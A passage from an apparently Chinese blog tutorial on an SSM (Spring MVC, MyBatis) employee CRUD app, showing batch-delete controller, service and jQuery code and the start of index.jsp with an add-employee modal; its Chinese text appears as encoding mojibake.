$(<span class="string">".check_item"</span>).length;</span><br><span class="line">    $(<span class="string">"#check_all"</span>).prop(<span class="string">"checked"</span>,flag);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>è¿™æ ·ä¸€ä¸ªå¤šé€‰åŠŸèƒ½å°±å®Œæˆäº†</p><p>ä¸ºäº†å¢åŠ ä»£ç å¤ç”¨ï¼Œæˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹Controller<br><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å•ä¸ªæ‰¹é‡äºŒåˆä¸€</span></span><br><span class="line"><span class="comment"> * æ‰¹é‡åˆ é™¤ï¼š1-2-3</span></span><br><span class="line"><span class="comment"> * å•ä¸ªåˆ é™¤ï¼š1</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param ids</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">@ResponseBody</span><br><span class="line">@<span class="constructor">RequestMapping(<span class="params">value</span> = <span class="string">"/emp/&#123;ids&#125;"</span>,<span class="params">method</span> = RequestMethod.DELETE)</span></span><br><span class="line">public Msg delete<span class="constructor">Emp(@PathVariable(<span class="string">"ids"</span>)</span>String ids)&#123;</span><br><span class="line">    <span class="comment">//æ‰¹é‡åˆ é™¤</span></span><br><span class="line">    <span class="keyword">if</span>(ids.contains(<span class="string">"-"</span>))&#123;</span><br><span class="line">        List&lt;Integer&gt; del_ids = <span class="keyword">new</span> ArrayList&lt;&gt;<span class="literal">()</span>;</span><br><span class="line">        String<span class="literal">[]</span> str_ids = ids.split(<span class="string">"-"</span>);</span><br><span class="line">        <span class="comment">//ç»„è£…idçš„é›†åˆ</span></span><br><span class="line">        for(String <span class="built_in">string</span> : str_ids)&#123;</span><br><span class="line">            del_ids.add(<span class="module-access"><span class="module"><span class="identifier">Integer</span>.</span></span>parse<span class="constructor">Int(<span class="params">string</span>)</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        employeeService.delete<span class="constructor">Batch(<span class="params">del_ids</span>)</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        Integer id = <span class="module-access"><span class="module"><span class="identifier">Integer</span>.</span></span>parse<span class="constructor">Int(<span class="params">ids</span>)</span>;</span><br><span class="line">        employeeService.delete<span class="constructor">Emp(<span class="params">id</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    return <span class="module-access"><span class="module"><span class="identifier">Msg</span>.</span></span>success<span class="literal">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>ä»¥åŠServiceå¯¹åº”çš„æ–¹æ³•<br><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public void delete<span class="constructor">Batch(List&lt;Integer&gt; <span class="params">ids</span>)</span> &#123;</span><br><span class="line">    EmployeeExample example = <span class="keyword">new</span> <span class="constructor">EmployeeExample()</span>;</span><br><span class="line">    EmployeeExample.Criteria criteria = example.create<span class="constructor">Criteria()</span>;</span><br><span class="line">    <span class="comment">//delete from xxx where emp_id in(1,2,3)</span></span><br><span class="line">    criteria.<span class="keyword">and</span><span class="constructor">EmpIdIn(<span class="params">ids</span>)</span>;</span><br><span class="line">    employeeMapper.delete<span class="constructor">ByExample(<span class="params">example</span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>index.jspä¹Ÿç®€è¦ä¿®æ”¹<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç‚¹å‡»å…¨éƒ¨åˆ é™¤ï¼Œå°±æ‰¹é‡åˆ é™¤</span></span><br><span class="line">    $(<span class="string">"#emp_delete_all_btn"</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">//$(".check_item:checked")</span></span><br><span class="line">        <span class="keyword">var</span> empNames = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">var</span> del_idstr = <span class="string">""</span>;</span><br><span class="line">        $.each($(<span class="string">".check_item:checked"</span>),<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">           <span class="comment">//this</span></span><br><span class="line">            empNames += $(<span class="keyword">this</span>).parents(<span class="string">"tr"</span>).find(<span class="string">"td:eq(2)"</span>).text()+<span class="string">"ï¼Œ"</span>;</span><br><span class="line">            <span class="comment">//ç»„è£…å‘˜å·¥idå­—ç¬¦ä¸²</span></span><br><span class="line">            del_idstr += $(<span class="keyword">this</span>).parents(<span class="string">"tr"</span>).find(<span class="string">"td:eq(1)"</span>).text()+<span class="string">"-"</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">//å»é™¤empNameså¤šä½™çš„,</span></span><br><span class="line">        empNames = empNames.substring(<span class="number">0</span>,empNames.length<span class="number">-1</span>);</span><br><span class="line">        <span class="comment">//å»é™¤åˆ é™¤çš„idå¤šä½™çš„-</span></span><br><span class="line">        del_idstr = del_idstr.substring(<span class="number">0</span>,del_idstr.length<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span>(confirm(<span class="string">"ç¡®è®¤åˆ é™¤["</span>+empNames+<span class="string">"]å—ï¼Ÿ"</span>))&#123;</span><br><span class="line">            <span class="comment">//å‘é€ajaxè¯·æ±‚</span></span><br><span class="line">            $.ajax(&#123;</span><br><span class="line">               url:<span class="string">"$&#123;APP_PATH&#125;/emp/"</span>+del_idstr,</span><br><span class="line">               type:<span class="string">"DELETE"</span>,</span><br><span class="line">               success:<span class="function"><span class="keyword">function</span> (<span class="params">result</span>)</span>&#123;</span><br><span class="line">                   alert(result.msg);</span><br><span class="line">                   <span class="comment">//å›åˆ°å½“å‰é¡µé¢</span></span><br><span class="line">                   to_page(currentPage);</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><br>è¿™æ ·å°±å®Œæˆäº†ä¸€ä¸ªå¤šé€‰åˆ é™¤çš„åŠŸèƒ½ï¼Œå•é€‰åˆ é™¤ä¹ŸåŒæ ·å¥æ•ˆ</p><p>åˆ°è¿™é‡Œæ•´ä¸ªçš„å¢åˆ æ”¹æŸ¥åŠŸèƒ½å°±å…¨éƒ¨åšå®Œäº†</p><p>æœ€åçš„index.jsp<br><figure class="highlight erb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-</span></span><br><span class="line"><span class="ruby">    webè·¯å¾„ï¼š</span></span><br><span class="line"><span class="ruby">        ä¸ä»¥/å¼€å§‹çš„ç›¸å¯¹è·¯å¾„ï¼Œæ‰¾èµ„æºï¼Œä»¥å½“å‰èµ„æºçš„è·¯å¾„ä¸ºåŸºå‡†ï¼Œç»å¸¸å®¹æ˜“å‡ºç°é—®é¢˜</span></span><br><span class="line"><span class="ruby">        ä»¥/å¼€å§‹çš„ç›¸å¯¹è·¯å¾„ï¼Œæ‰¾èµ„æºï¼Œä»¥æœåŠ¡å™¨çš„è·¯å¾„ä¸ºæ ‡å‡†ï¼ˆ<span class="symbol">http:</span>/<span class="regexp">/localhost:3306ï¼‰éœ€è¦åŠ ä¸Šé¡¹ç›®å</span></span></span><br><span class="line"><span class="ruby">            <span class="symbol">http:</span>/<span class="regexp">/localhost:3306/crud</span></span></span><br><span class="line"><span class="ruby">-</span><span class="xml">-%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> </span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@ taglib uri=<span class="string">"http://java.sun.com/jsp/jstl/core"</span> prefix=<span class="string">"c"</span></span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>å‘˜å·¥åˆ—è¡¨<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%</span></span></span></span><br><span class="line"><span class="ruby">        pageContext.setAttribute(<span class="string">"APP_PATH"</span>,request.getContextPath());</span></span><br><span class="line"><span class="ruby">    </span><span class="xml">%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"$&#123;APP_PATH&#125;/static/bootstrap-3.3.7-dist/css/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$&#123;APP_PATH&#125;/static/js/jquery-3.5.1.min.js"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$&#123;APP_PATH&#125;/static/bootstrap-3.3.7-dist/js/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- å‘˜å·¥æ·»åŠ çš„æ¨¡æ€æ¡† --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal fade"</span> <span class="attr">id</span>=<span class="string">"empAddModal"</span> <span class="attr">tabindex</span>=<span class="string">"-1"</span> <span class="attr">role</span>=<span class="string">"dialog"</span> <span class="attr">aria-labelledby</span>=<span class="string">"myModalLabel"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-dialog"</span> <span class="attr">role</span>=<span class="string">"document"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-content"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-header"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"close"</span> <span class="attr">data-dismiss</span>=<span class="string">"modal"</span> <span class="attr">aria-label</span>=<span class="string">"Close"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span>&amp;times;<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">h4</span> <span class="attr">class</span>=<span class="string">"modal-title"</span> <span class="attr">id</span>=<span class="string">"myModalLabel"</span>&gt;</span>å‘˜å·¥æ·»åŠ <span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-body"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">"form-horizontal"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>empName<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"empName"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"empName_add_input"</span> <span class="attr">placeholder</span>=<span class="string">"empName"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"help-block"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>email<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"email"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"email_add_input"</span> <span class="attr">placeholder</span>=<span class="string">"email@qq.com"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"help-block"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>gender<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span 